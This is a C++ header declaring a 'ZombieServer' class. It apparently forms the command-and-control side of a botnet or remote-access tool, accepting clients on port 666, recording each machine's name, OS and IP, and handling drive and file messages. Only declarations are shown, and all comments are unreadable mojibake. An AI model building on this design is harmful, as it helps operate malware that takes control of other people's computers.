#pragma once

#define PORT 666							// ���� ��� ����������� ��������
#define MAX_CLIENT 20						// ������������ ����� ������������ ��������
#define PACKET_SIZE	4112					// ������ ���������, ������� ������������ ������ � ������
#define PACKET_DATA_SIZE 4096				// ������ ������ � ������
#define SEND_BUFFER_SIZE PACKET_SIZE * 10	// ������ ������� ��� �������� ������ �������

// ��������� �������, ������� ������ ������������ ����
#define WM_JOINED_CLIENT	WM_USER+1
#define WM_CLOSE_CLIENT		WM_USER+2
#define WM_CMD_REPORT		WM_USER+3
#define WM_DRIVE			WM_USER+4
#define WM_FILE				WM_USER+5

struct User
{
	char id[128];
	char name[128];
	char os[128];
	char ip[128];
	char ver[128];

	wchar_t wID[128];
	wchar_t wName[128];
	wchar_t wOS[128];
	wchar_t wIP[128];
	wchar_t wVer[128];
};

struct UserFile
{
	char name[128];
	char size[128];
	char type[128];
	int image;
};

class ZombieServer
{
public:
	ZombieServer();
	BOOL StartServer(HWND hWnd);							// �������� ������ � ���������� ������� ������� � ����
	BOOL SendPacket(int id, Packet* packet);				// �������� ���������

private:
	static DWORD WINAPI ThreadEvents(LPVOID lpParameter);	// ����� ��������� ������� �������
	BOOL AcceptClient(DWORD index);							// ���������� ������ �������
	BOOL WriteClient(DWORD index);							// ���������� ������ �� ���������� �������
	BOOL ReadClient(DWORD index);							// ������ ��������� ���������									
	void CloseClient(DWORD index);							// ��������� ���������� � �������� (���������� ID ���������������� �������)
	void WorkData(Packet* pak);
	void  ParseUser(char*, User*);
	void Crypt(char* cryptData, int sizeCryptData);
	DWORD ParsePacketType(char* data);
	DWORD ParseID(char* data);
	DWORD ParseID1(char* data);
	DWORD ParseID2(char* data);

	HWND hWnd;												// ����� ����, �������� ���������� ���������� ���������

	int GetID(DWORD index);	// ���������� ID ����
	SOCKET client_socket[MAX_CLIENT + 1];
	WSAEVENT client_event[MAX_CLIENT + 1];
	int eventTotal;

	// ���������� ������
	BOOL writeAccess[MAX_CLIENT + 1];				// ��������� ������� � ������ � �����
	char recvBuffer[MAX_CLIENT + 1][PACKET_SIZE];	// ����� ��� ������ ������
	char* writeBuffer[MAX_CLIENT + 1];				// ��������� �� ��������� ����� ������������ ������
	int sizeWriteBuffer[MAX_CLIENT + 1];			// ������ ���������� ������ ������������ ������ (����� �������������)
	int id[MAX_CLIENT + 1];							// id �������
	int numRecv[MAX_CLIENT + 1];					// ����� ���� � ������ �������� ������
	int numSend[MAX_CLIENT + 1];					// ����� ��� ���������� ���� �� ��������� ������ ������������ ������ (writeBuffer)

													// ���������� ID ����������� �������� �������
	int unicID;
};

